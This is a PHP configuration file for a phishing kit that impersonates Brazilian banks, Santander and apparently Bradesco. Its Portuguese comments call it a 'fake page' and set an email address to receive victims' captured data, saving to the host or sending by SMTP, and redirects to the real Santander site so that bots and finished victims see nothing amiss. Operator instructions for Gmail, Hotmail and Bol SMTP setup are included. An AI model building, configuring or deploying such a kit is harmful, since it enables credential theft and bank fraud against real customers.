<?php

/* CONFIGURAÇÕES PÁGINA FAKE */
$destino 			= 'SEU_EMAIL_AQUI'; // E-MAIL QUE RECEBERÁ AS INFO!

/* CONFIGURAÇOES DAS INFO */
$SalvarTxt 			= 'sim'; // SALVAR INFO NA PROPRIA HOST | 'sim' OU 'nao'
$EnviarSMTP 		= 'nao'; // ENVIAR AS INFO SALVA VIA SMTP | 'sim' OU 'nao'

/* CONFIGURAÇÃO DE AUTOCARREGAMENTO */
$AutoCarregamento 	= '60'; // cada minuto equivale a 60 segundos, então 90 = 1 minuto e meio | 120 = 2 minutos | 

/* CONFIGURAÇÕES DE REDIRECIONAMENTO */
$UrlRedirErro 		= 'https://www.santander.com.br/br/pessoa-fisica/santander/'; // REDIRECIONAMENTO PARA INSTRUSOS, BOTS, ROBÔS E AFINS
$UrlRedirFinal 		= 'https://www.santander.com.br/br/pessoa-fisica/santander/'; // REDIRECIONAMENTO APÓS INFORMAR TODOS OS DADOS.

/* CONFIGURAÇÃO DE CONSULTAR NOMES */
$chaveApi 			= '5ae973d7a997af13f0aaf2bf60e65803'; // <- ESTE NÚMERO DA API SOMENTE RETORNA UM ÚNICO NOME, SERÁ PRECISO COLOCAR 1 TOKEN VÁLIDO!

/* CONFIGURAÇÃO SMTP */
define("MAILHOST", "smtp.gmail.com");
define("MAILPORT", "587");
define("MAILUSER", "EMAIL_SMTP_AQUI");
define("MAILPASS", "SENHA_EMAIL_AQUI");

/*
ORIENTAÇÃO DE CONFIGURAÇÃO:
Quando usar 'ssl', define a porta de envio como "465"
Quando usar 'tls', defina a porta de envio como "587"

** Para envios usando GMail, use 'tls' com a porta "587", e realize a liberação de aplicativos nas configurações de sua conta. 		| smtp.gmail.com 	**
** Para envios usando Hotmail(Live), use 'tls' com a porta "587", e realize a liberação de envio nas configurações de sua conta. 	| smtp.live.com 	**
** Para envio usando Bol, use 'tls' com a porta "587", e realize a liberação de envio nas configurações de sua conta 				| smtps.bol.com.br 	**

** Caso, utilize outro servidor SMTP, procure as informações do seu servidor para realizar as configurações do envio SMTP **
** IMPORTANTE: Se você utilizar o mesmo e-mail para enviar e receber as info, você receberá as info de forma desordenadas. **
** Aconselho usar 1 conta para envio, e outra para recebimento! **

*/
$SecureSMTP		= 'tls'; // 'tls' OU 'ssl' | A depedender das configurações SMTP do seu provedor.

/* CONFIGURAÇÃO BANCO DE DADOS */
define("DBSW", "sqlite"); // sqlite ou mysql

// fill only for sqlite
define("LITE", dirname(__FILE__).'/data1.sqlite');

// fill only for mysql
define("HOST","localhost"); 		// ENDEREÇO FÍSICO DO SERVIDOR
define("USER","root"); 				// USUARIO DO BANCO DE DADOS
define("PASS","1234"); 					// SENHA DO BANCO DE DADOS
define("DBSA","brada"); 			// NOME DO BANCO DE DADOS

?>